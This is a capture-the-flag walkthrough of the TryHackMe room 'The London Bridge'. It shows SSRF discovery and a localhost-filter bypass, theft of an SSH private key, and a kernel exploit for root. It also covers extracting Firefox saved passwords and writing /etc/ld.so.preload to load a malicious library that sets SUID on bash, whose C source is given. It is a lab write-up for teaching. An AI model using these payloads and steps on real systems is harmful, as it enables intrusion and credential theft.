---
title: "TryHackMe: The London Bridge"
author: jaxafed
categories: [TryHackMe]
tags: [web, ffuf, fuzz, ssrf, kernel exploit, firefox]
render_with_liquid: false
media_subpath: /images/tryhackme_the_london_bridge/
image:
  path: room_image.webp
---

The London Bridge began with fuzzing a web application to discover an endpoint. By fuzzing this endpoint for parameters, we identified one vulnerable to SSRF. Using this vulnerability to enumerate internal applications, we discovered another web application. After fuzzing the internal web application, we found an SSH key, which allowed us to obtain a shell. Once we had a shell, we utilized a kernel exploit to escalate our privileges to root. We ended the room by dumping the saved credentials from a user's Firefox profile to retrieve their password.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/thelondonbridge){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.59.255
Nmap scan report for 10.10.59.255
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http-proxy gunicorn
|_http-server-header: gunicorn
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

- 22/SSH
- 8080/HTTP

### Web 8080

Visiting `http://10.10.59.255:8080/`, we see a page about London.

![Web 8080 Index](web_8080_index.webp){: width="1200" height="600" }

Upon checking the linked pages, `http://10.10.59.255:8080/gallery` seems interesting as it allows image uploads. However, since it is a Python application, there doesn't appear to be much we can do with it for now.

![Web 8080 Gallery](web_8080_gallery.webp){: width="1200" height="600" }

Checking the source code for the page reveals an interesting comment about being able to upload images using a URL.

![Web 8080 Gallery Source](web_8080_gallery_source.webp){: width="1200" height="600" }

## Shell as beth

### Discovering SSRF

Fuzzing the application for directories reveals the `/view_image` endpoint.

```console
$ ffuf -u 'http://10.10.59.255:8080/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc all -ic -t 50 -fs 232
...
view_image              [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 130ms]
```
{: .wrap }

Checking `http://10.10.59.255:8080/view_image`, we see that it does not accept `GET` requests.

![Web 8080 View Image](web_8080_view_image.webp){: width="1200" height="600" }

However, if we send a `POST` request, it displays a form where we can enter a URL.

![Web 8080 View Image Post](web_8080_view_image_post.webp){: width="1200" height="600" }

Testing the form with a URL for our server shows that it uses the `image_url` parameter to send our input. However, we don't observe any requests being made to our server; it appears the application simply takes our input and displays it using the `img` tag.

![Web 8080 View Image Image Url](web_8080_view_image_image_url.webp){: width="1100" height="500" }

Fuzzing for other parameters it might accept, we discover the `www` parameter.

```console
$ ffuf -u 'http://10.10.59.255:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.11.72.22/test' -mc all -t 50 -ic -fs 823
...
www                     [Status: 200, Size: 335, Words: 84, Lines: 14, Duration: 572ms]
```
{: .wrap }

This time, we can see the server making a request to our server.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.59.255 - - [26/Sep/2024 15:53:01] code 404, message File not found
10.10.59.255 - - [26/Sep/2024 15:53:01] "GET /test HTTP/1.1" 404 -
```

Creating the `test` file and making the request manually reveals that the server not only makes the request but also returns the response.

![Web 8080 View Image Www](web_8080_view_image_www.webp){: width="1100" height="500" }

### Enumerating Internal Services

Now that we have an `SSRF` vulnerability, we can use it to enumerate the internal services.

However, when attempting this, we see that using `127.0.0.1` or `localhost` in our URL results in a `403 FORBIDDEN` response. This indicates that there is likely a filter in place.

![Web 8080 View Image Www Localhost](web_8080_view_image_www_localhost.webp){: width="1100" height="500" }

Looking for other payloads to access `localhost`, we can find many options [here](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass#localhost). Using `http://127.1/` not only allows us to bypass the filter, but we also discover an internal web application running on `127.0.0.1:80`.

![Web 8080 View Image Www Bypass](web_8080_view_image_www_bypass.webp){: width="1100" height="500" }

Fuzzing this internal web application for directories, we discover the `.ssh` directory.

```console
$ ffuf -u 'http://10.10.59.255:8080/view_image' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.1/FUZZ' -mc all -t 50 -ic -fs 469
...
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 142ms]
```
{: .wrap }

Checking `http://127.1/.ssh`, we see that indexing is enabled and there are two files.

![Web 8080 View Image Www Ssh](web_8080_view_image_www_ssh.webp){: width="1100" height="500" }

Reading `http://127.1/.ssh/id_rsa`, we obtain a private key.

```console
$ curl -s 'http://10.10.59.255:8080/view_image' -d 'www=http://127.1/.ssh/id_rsa' -o id_rsa
$ chmod 600 id_rsa
```
{: .wrap }

Reading `http://127.1/.ssh/authorized_keys`, we find a username: `beth`.

```console
$ curl -s 'http://10.10.59.255:8080/view_image' -d 'www=http://127.1/.ssh/authorized_keys'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```
{: .wrap }

Using the private key, we are able to SSH as the `beth` user.

```console
$ ssh -i id_rsa beth@10.10.59.255
...
beth@london:~$ id
uid=1000(beth) gid=1000(beth) groups=1000(beth)
```

We can find the user flag inside `/home/beth/__pycache__/user.txt`.

```console
beth@london:~$ wc -c __pycache__/user.txt
25 __pycache__/user.txt
```

## Shell as root

Checking the kernel version reveals that it is quite old.

```console
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Running `linpeas.sh` suggests the `CVE-2018-18955` vulnerability.

```console
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
```


For this, we will need a couple of files found [here](https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955).

After downloading `exploit.dbus.sh`, `rootshell.c`, `subshell.c`, and `subuid_shell.c`, and transferring them to the machine, running the exploit provides us with a shell as the `root` user, allowing us to read the root flag at `/root/.root.txt`.

```console
beth@london:/tmp/exp$ ls
exploit.dbus.sh  rootshell.c  subshell.c  subuid_shell.c
beth@london:/tmp/exp$ bash exploit.dbus.sh
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Sep 26 10:11 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:/tmp/exp# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
root@london:/tmp/exp# wc -c /root/.root.txt
27 /root/.root.txt
```

## Password of charles

The last question of the room is the password for the `charles` user.

Checking the home directory for the user, we find the `.mozilla` directory.

```console
root@london:/home/charles# ls -la
total 24
drw------- 3 charles charles 4096 Apr 23 22:11 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23 22:11 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```

Inside the directory, we find a `Firefox` profile. If the user has saved credentials, we can extract them.

```console
root@london:/home/charles/.mozilla# ls -la firefox/
total 12
drw-------  3 charles charles 4096 Mar 16  2024 .
drw-------  3 charles charles 4096 Mar 16  2024 ..
drw------- 16 charles beth    4096 Mar 16  2024 8k3bf3zp.charles
```

First, we archive the directory and transfer it to our machine.

```console
root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox
```

```console
$ scp -i id_rsa beth@10.10.59.255:/tmp/firefox.tar.gz .
```

Extracting the archive and fixing the permission issues.

```console
$ tar -xvzf firefox.tar.gz
$ sudo chmod -R 777 firefox
```

Now, using the [`firefox_decrypt`](https://github.com/unode/firefox_decrypt) program to extract the credentials, we obtain the password for the `charles` user and complete the room.

```console
$ python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles
2024-09-26 17:29:13,245 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles
2024-09-26 17:29:13,246 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '[REDACTED]'
```

## Unintended root

After obtaining a shell as the `beth` user, we notice that the application on port `8080` runs as the `root` user.

```console
beth@london:~$ ps -aux | grep gunicorn
root       437  0.0  1.1  75640 22212 ?        Ss   08:30   0:01 /usr/bin/python3 /home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app
...
```
{: .wrap }

Checking the source code for the application in `/home/beth/app.py`, we see that the application uses `app.config['UPLOAD_FOLDER']` while performing many operations.

```python
@app.route('/gallery')
def gallery():
    filenames = os.listdir(app.config['UPLOAD_FOLDER'])
    return render_template('index.html', filenames=filenames)
...
@app.route('/uploads/<filename>')
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
```

Currently, `app.config['UPLOAD_FOLDER']` is set to `/home/beth/uploads`.

```python
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
```

The issue is that the `beth` user owns the `uploads` directory, allowing us to change it from a directory to a `symlink` pointing to any directory we want.

For example, we can change it to a `symlink` pointing to the `/etc` directory.

```console
beth@london:~$ mv uploads/ uploads.bak
beth@london:~$ ln -s /etc uploads
beth@london:~$ ls -la uploads
lrwxrwxrwx 1 beth beth 4 Sep 26 10:37 uploads -> /etc
```

After this, if we make a request to the `http://10.10.59.255:8080/gallery` endpoint, we see it lists the contents of the `/etc` directory instead of `/home/beth/uploads`.

![Web 8080 Unintended One](web_8080_unintended_one.webp){: width="1100" height="500" }

Not only can we disclose files and directories, but we can also use the `/uploads/<filename>` endpoint to read the disclosed files.

![Web 8080 Unintended Two](web_8080_unintended_two.webp){: width="1100" height="500" }

While this arbitrary file read vulnerability is enough to complete the room by setting `/home/beth/uploads` as a symlink pointing to `/root` to read the root flag, and by setting it as a symlink pointing to `/home/charles/.mozilla/firefox/8k3bf3zp.charles` to download the files needed to extract credentials, we can also take it one step further.

Not only can we disclose files and read them, but by checking the source code for the `/upload` endpoint, we see that we are also able to write files using the upload functionality.

```python
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return "No file part"
    file = request.files['file']
    if file.filename == '':
        return "No selected file"
    if file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(file_path)
        if is_image(file_path):
            return redirect(url_for('gallery'))
        else:
            os.remove(file_path)  # Remove the non-image file
            return "Uploaded file is not an image"
    return "Invalid file"
```

To turn this file write capability into RCE, there are some files we can write. However, the problem is the `is_image()` check in `/upload`, which uses the `PIL` module's `verify()` method, and if it fails, deletes the uploaded file.

```python
def is_image(file_path):
    try:
        with Image.open(file_path) as img:
            img.verify()
        return True
    except:
        return False
```

The `verify()` method is primarily used for checking file integrity rather than confirming a file is an image, so we can easily bypass it by prepending a valid image to our payload. However, due to the prepended data in our write, most of the files we could use to gain RCE will not work due to syntax errors.

Looking for files we can exploit, we come across `/etc/ld.so.preload`, which is a configuration file in Linux that specifies shared libraries to be loaded before others when programs are executed. It also works with `SUID` binaries, allowing us to load and run our library as the `root` user.

To abuse this, we first need to create a shared library that will set the `SUID` bit for `/bin/bash`.

```console
beth@london:~$ cat /tmp/pe.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/chmod +s /bin/bash");
}
beth@london:~$ gcc -fPIC -shared -o /tmp/pe.so /tmp/pe.c -nostartfiles
beth@london:~$ ls -la /tmp/pe.so
-rwxrwxr-x 1 beth beth 6456 Sep 26 11:21 /tmp/pe.so
```

Ensuring that `/home/beth/uploads` points to the `/etc` directory.

```console
beth@london:~$ ls -la uploads
lrwxrwxrwx 1 beth beth 4 Sep 26 10:37 uploads -> /etc
```

Now, all we have to do is write `/tmp/pe.so` to the `/etc/ld.so.preload` file.

As mentioned, we can prepend a valid image to our payload to bypass the `verify()` check. We will use the `PPM` format, as it allows us to create an image that both bypasses the filter and is small in size, without including any special characters that could cause errors and we will use `ld.so.preload` as our filename.

As we can see, we are successful with this.

![Web 8080 Unintended Three](web_8080_unintended_three.webp){: width="1100" height="500" }

Now, running any `SUID` binary, in this case `ping`, we can see the system trying to load the libraries specified in `/etc/ld.so.preload`. First, it attempts to load our prepended data as libraries, then loads the `/tmp/pe.so` library. After executing the program, we can verify that our library was loaded and run by checking the permissions on the `/bin/bash` binary.

```console
beth@london:~$ ping -c 1 127.0.0.1
ERROR: ld.so: object 'P6' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '1' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
ERROR: ld.so: object '1' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
beth@london:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

At last, we can use `/bin/bash` to spawn a shell as `root`.

```console
beth@london:~$ /bin/bash -p
bash-4.4# python3 -c 'import os;import pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
root@london:~# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
root@london:~# wc -c /root/.root.txt
27 /root/.root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>